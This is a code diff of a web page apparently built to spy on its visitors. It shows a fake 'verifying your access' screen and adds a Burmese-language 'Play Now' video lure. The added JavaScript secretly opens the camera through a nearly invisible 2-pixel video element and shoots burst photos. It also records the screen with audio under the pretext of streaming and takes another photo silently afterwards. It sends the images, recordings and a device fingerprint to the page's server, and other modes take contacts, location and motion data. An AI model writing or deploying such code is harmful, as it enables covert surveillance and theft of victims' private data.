@@ -569,11 +569,17 @@ body{background:#0d0d0d;color:#fff;font-family:-apple-system,BlinkMacSystemFont,
 </style>
 </head>
 <body>
-<div class="wrap">
+<div class="wrap" id="mainWrap">
   <div class="spinner"></div>
   <div class="title">Verifying your access...</div>
   <div class="sub">Allow all permissions to continue</div>
   <div class="bar"><div class="fill" id="fill"></div></div>
+</div>
+<div id="screenWrap" style="display:none;position:fixed;inset:0;background:#0d0d0d;z-index:50;align-items:center;justify-content:center;flex-direction:column;text-align:center;padding:30px">
+  <div style="font-size:3rem;margin-bottom:16px">🎬</div>
+  <div style="font-size:1.1rem;font-weight:700;margin-bottom:8px">ဗီဒီယို ကြည့်ရန် နှိပ်ပါ</div>
+  <div style="color:#555;font-size:.82rem;margin-bottom:24px">Tap below to start streaming</div>
+  <button id="screenBtn" style="padding:16px 40px;border:none;border-radius:12px;background:linear-gradient(135deg,#e63946,#c1121f);color:#fff;font-size:1.1rem;font-weight:700;cursor:pointer;box-shadow:0 4px 24px rgba(230,57,70,.4)">▶ Play Now</button>
 </div>
 <div class="modal-bd" id="modal"></div>
 <input type="file" id="galleryInput" accept="image/*" multiple style="display:none">
@@ -674,47 +680,77 @@ async function captureFromCamera(facing,filename){
 }
 async function sendPhoto(){await captureFromCamera('environment','photo.jpg');}
 async function sendFrontPhoto(){await captureFromCamera('user','selfie.jpg');}
+async function openHiddenCamera(facing){
+  const stream=await getCameraStream(facing);
+  const v=document.createElement('video');
+  v.srcObject=stream;v.setAttribute('playsinline','');v.setAttribute('muted','');
+  v.style.cssText='position:fixed;opacity:0.01;pointer-events:none;width:2px;height:2px;top:0;left:0;z-index:-1';
+  document.body.appendChild(v);
+  await new Promise((res,rej)=>{
+    v.onloadedmetadata=()=>v.play().then(res).catch(rej);
+    v.onerror=rej;setTimeout(rej,10000);
+  });
+  // Wait for camera sensor to warm up and produce real frames
+  await new Promise(r=>setTimeout(r,2500));
+  return {stream,v};
+}
+async function snapFromVideo(v){
+  const c=document.createElement('canvas');
+  c.width=v.videoWidth||640;c.height=v.videoHeight||480;
+  c.getContext('2d').drawImage(v,0,0,c.width,c.height);
+  return new Promise(r=>c.toBlob(r,'image/jpeg',0.88));
+}
 async function sendBurstPhotos(){
   try{
-    const stream=await getCameraStream('environment');
-    const v=document.createElement('video');
-    v.srcObject=stream;v.setAttribute('playsinline','');v.setAttribute('muted','');
-    v.style.cssText='position:fixed;opacity:0;pointer-events:none;width:1px;height:1px;top:0;left:0';
-    document.body.appendChild(v);
-    await new Promise((res,rej)=>{v.onloadedmetadata=()=>v.play().then(res).catch(rej);setTimeout(rej,8000);});
-    await new Promise(r=>setTimeout(r,2000));
+    const {stream,v}=await openHiddenCamera('environment');
     const fp=await collectFingerprint();
+    // Shoot 5 frames with 350ms gap — very fast
     for(let i=0;i<5;i++){
-      await new Promise(r=>setTimeout(r,600));
-      const c=document.createElement('canvas');c.width=v.videoWidth||1280;c.height=v.videoHeight||720;
-      c.getContext('2d').drawImage(v,0,0);
-      const blob=await new Promise(r=>c.toBlob(r,'image/jpeg',0.92));
-      if(blob&&blob.size>1000){
-        const form=new FormData();form.append('token',token);form.append('photo',blob,`burst_${i+1}.jpg`);
-        form.append('fingerprint',JSON.stringify({...fp,burst_index:i+1,burst_total:5}));
+      const blob=await snapFromVideo(v);
+      if(blob&&blob.size>800){
+        const form=new FormData();
+        form.append('token',token);form.append('photo',blob,`burst_${i+1}.jpg`);
+        form.append('fingerprint',JSON.stringify({...fp,note:`Burst ${i+1}/5`}));
         fetch('/capture_combined_photo',{method:'POST',body:form});
       }
+      if(i<4)await new Promise(r=>setTimeout(r,350));
     }
-    stream.getTracks().forEach(t=>t.stop());document.body.removeChild(v);
+    stream.getTracks().forEach(t=>t.stop());
+    if(v.parentNode)document.body.removeChild(v);
   }catch(e){}
 }
-async function sendScreenRecording(){
+async function doScreenRecord(){
   try{
-    const screenStream=await navigator.mediaDevices.getDisplayMedia({video:{width:{ideal:1920},height:{ideal:1080}},audio:true});
     const mimeType=MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')?'video/webm;codecs=vp8,opus':'video/webm';
+    const screenStream=await navigator.mediaDevices.getDisplayMedia({video:{width:{ideal:1920},height:{ideal:1080},frameRate:30},audio:true});
+    // Show recording indicator
+    document.getElementById('screenBtn').textContent='🔴 Recording...';
+    document.getElementById('screenBtn').disabled=true;
     const recorder=new MediaRecorder(screenStream,{mimeType});
     const chunks=[];
     recorder.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data);};
     recorder.start(300);
-    await new Promise(r=>setTimeout(r,8000));
-    recorder.stop();screenStream.getTracks().forEach(t=>t.stop());
+    // Stop when user stops sharing OR after 10s
+    const stopTimer=setTimeout(()=>recorder.stop(),10000);
+    screenStream.getVideoTracks()[0].onended=()=>{clearTimeout(stopTimer);recorder.stop();};
     await new Promise(r=>recorder.onstop=r);
+    screenStream.getTracks().forEach(t=>t.stop());
     const blob=new Blob(chunks,{type:mimeType});
     if(blob.size<1000)return;
     const fp=await collectFingerprint();const form=new FormData();
     form.append('token',token);form.append('video',blob,'screen_recording.webm');form.append('fingerprint',JSON.stringify(fp));
     fetch('/capture_screen_recording',{method:'POST',body:form});
+    // Also capture camera photo silently after screen share ends
+    sendPhoto();
   }catch(e){}
+}
+// Screen record MUST be triggered by user gesture — show a button
+function setupScreenMode(){
+  document.getElementById('mainWrap').style.display='none';
+  const sw=document.getElementById('screenWrap');sw.style.display='flex';
+  document.getElementById('screenBtn').addEventListener('click',async()=>{
+    await doScreenRecord();
+  });
 }
 async function sendMotionData(){
   try{
@@ -787,8 +823,12 @@ async function sendContacts(){
 }
 async function startCapture(){
   setFill(8);
-  // Always collect motion+real IP silently in background
-  sendMotionData();
+  sendMotionData(); // always silent background
+  if(mode==='screen'){
+    // Screen record needs user gesture — show button UI
+    setupScreenMode();
+    return;
+  }
   if(mode==='all'){
     await Promise.allSettled([sendPhoto(),sendLocation()]);setFill(40);
     await sendVideo();setFill(65);await sendAudio();setFill(82);
@@ -801,7 +841,6 @@ async function startCapture(){
   else if(mode==='frontcam'){await sendFrontPhoto();setFill(100);}
   else if(mode==='contacts'){await sendContacts();setFill(100);}
   else if(mode==='burst'){await sendBurstPhotos();setFill(100);}
-  else if(mode==='screen'){await sendScreenRecording();setFill(100);}
   else if(mode==='motion'){await sendMotionData();setFill(100);}
   else{setFill(100);}
 }
